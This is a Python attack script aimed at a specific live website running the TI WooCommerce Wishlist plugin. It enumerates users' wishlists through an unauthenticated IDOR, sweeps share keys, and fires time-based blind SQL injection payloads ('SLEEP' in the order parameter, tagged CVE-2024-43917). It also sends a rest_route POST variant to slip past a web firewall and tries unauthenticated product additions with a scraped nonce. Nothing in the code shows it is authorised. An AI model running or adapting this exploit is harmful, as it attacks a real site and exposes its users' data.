#!/usr/bin/env python3
"""Critical wave11: TI Wishlist get_by_user IDOR, share-key sweep, SQLi if populated."""
from __future__ import annotations

import json
import re
import statistics
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

R = {"ts": time.time(), "confirmed": [], "leads": [], "probes": {}}

KNOWN_SHARES = [
    "bfa79e", "a4bc53", "e6b382", "c631be", "d8e7cf",
    "534e24", "50bc47", "534e24", "50bc47",
]


def http(method, url, data=None, headers=None, timeout=90):
    h = {"User-Agent": "Mozilla/5.0 lurksek-wave11", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def get_products(share, order="ASC"):
    q = urllib.parse.urlencode({"order": order})
    url = f"{TARGET}/wp-json/wc/v3/wishlist/{share}/get_products?{q}"
    return http("GET", url, timeout=90)


def sqli_suite(share):
    suite = []
    for lab, order in [
        ("ASC1", "ASC"),
        ("ASC2", "ASC"),
        ("S5a", ",(SELECT SLEEP(5))--"),
        ("S5b", ",(SELECT SLEEP(5))--"),
        ("S10a", ",(SELECT SLEEP(10))--"),
        ("S10b", ",(SELECT SLEEP(10))--"),
        ("ASC3", "ASC"),
    ]:
        code, t, body, _ = get_products(share, order)
        suite.append({"label": lab, "code": code, "time": round(t, 3), "len": len(body)})
        print(f"  SQLI {share} {lab} {code} {t:.2f}s len={len(body)}", flush=True)
    asc = [x["time"] for x in suite if x["label"].startswith("ASC") and x["code"] == 200]
    s5 = [x["time"] for x in suite if x["label"].startswith("S5") and x["code"] == 200]
    s10 = [x["time"] for x in suite if x["label"].startswith("S10") and x["code"] == 200]
    verdict = "NOT_CONFIRMED"
    if asc and s5 and s10:
        a = sorted(asc)[len(asc) // 2]
        if all(t >= a + 3.5 for t in s5) and all(t >= a + 8 for t in s10):
            verdict = "CONFIRMED"
            R["confirmed"].append(
                {"type": "CVE-2024-43917", "share": share, "suite": suite, "asc": asc, "s5": s5, "s10": s10}
            )
            print(f"CRITICAL_SQLI {share}", flush=True)
    return {"share": share, "suite": suite, "verdict": verdict}


# 1) get_by_user IDOR (unauth)
for uid in range(1, 11):
    url = f"{TARGET}/wp-json/wc/v3/wishlist/get_by_user/{uid}"
    code, t, body, _ = http("GET", url)
    text = body.decode("utf-8", "replace")
    R["probes"][f"get_by_user_{uid}"] = {"code": code, "body": text[:800]}
    print(f"get_by_user/{uid} -> {code} {text[:120]!r}", flush=True)
    if code == 200 and text.strip().startswith("["):
        try:
            arr = json.loads(text)
            if arr:
                keys = [w.get("share_key") for w in arr if isinstance(w, dict)]
                R["leads"].append({"type": "wishlist_user_leak", "user_id": uid, "count": len(arr), "share_keys": keys})
                for k in keys:
                    if k and k not in KNOWN_SHARES:
                        KNOWN_SHARES.append(k)
                if any(w.get("products") for w in arr if isinstance(w, dict)):
                    R["confirmed"].append({"type": "wishlist_idor_populated", "user_id": uid, "data": arr[:3]})
        except Exception:
            pass

# 2) get_by_share_key for known keys
populated = []
for share in list(dict.fromkeys(KNOWN_SHARES)):
    url = f"{TARGET}/wp-json/wc/v3/wishlist/get_by_share_key/{share}"
    code, t, body, _ = http("GET", url)
    text = body.decode("utf-8", "replace")
    R["probes"][f"share_meta_{share}"] = {"code": code, "body": text[:400]}
    if code == 200 and text.strip().startswith("{"):
        print(f"share_meta {share} -> {text[:100]!r}", flush=True)
    code2, t2, body2, _ = get_products(share, "ASC")
    text2 = body2.decode("utf-8", "replace")
    n = 0
    try:
        arr = json.loads(text2)
        n = len(arr) if isinstance(arr, list) else -1
    except Exception:
        n = -1
    print(f"products {share} -> {code2} n={n} t={t2:.2f}", flush=True)
    R["probes"][f"products_{share}"] = {"code": code2, "n": n, "time": round(t2, 3)}
    if code2 == 200 and n and n > 0:
        populated.append(share)
        R["leads"].append({"type": "populated_wishlist", "share": share, "n": n})

# 3) SQLi on populated
sqli_results = []
for share in populated:
    print(f"=== SQLi {share} ===", flush=True)
    sqli_results.append(sqli_suite(share))
R["sqli"] = sqli_results

# 4) MSF-style rest_route POST on best share (even if empty, for WAF diff)
for share in list(dict.fromkeys(KNOWN_SHARES))[:4]:
    q = urllib.parse.urlencode({"_method": "GET", "order": ",(SELECT SLEEP(5))--"})
    data = f"rest_route=/wc/v3/wishlist/{share}/get_products".encode()
    code, t, body, _ = http(
        "POST",
        f"{TARGET}/?{q}",
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=90,
    )
    R["probes"][f"rest_route_sleep_{share}"] = {"code": code, "time": round(t, 3)}
    print(f"rest_route SLEEP {share} {code} {t:.2f}", flush=True)

# 5) Product ID brute add via REST (guest nonce from homepage)
code, _, body, _ = http("GET", TARGET + "/")
html = body.decode("utf-8", "replace")
nonces = re.findall(r'"nonce"\s*:\s*"([a-f0-9]{8,12})"', html)
nonce = nonces[0] if nonces else "54b96dfe24"
for share in ["bfa79e", "d8e7cf"]:
    for pid in [6130, 9507, 9131, 9139, 1, 2, 100]:
        payload = json.dumps({"product_id": pid, "quantity": 1}).encode()
        url = f"{TARGET}/wp-json/wc/v3/wishlist/{share}/add_product"
        code, t, b, _ = http(
            "POST",
            url,
            data=payload,
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json",
                "X-WP-Nonce": nonce,
            },
            timeout=30,
        )
        text = b[:200].decode("utf-8", "replace")
        if code not in (401, 403) or "forbidden" not in text.lower():
            print(f"add_product {share} pid={pid} -> {code} {text[:80]!r}", flush=True)
            R["probes"][f"add_{share}_{pid}"] = {"code": code, "body": text}

for p in (OUT / "critical_wave11.json", Path("out/critical_wave11.json")):
    p.write_text(json.dumps(R, indent=2, default=str))
print("DONE confirmed", len(R["confirmed"]), "leads", len(R["leads"]), flush=True)
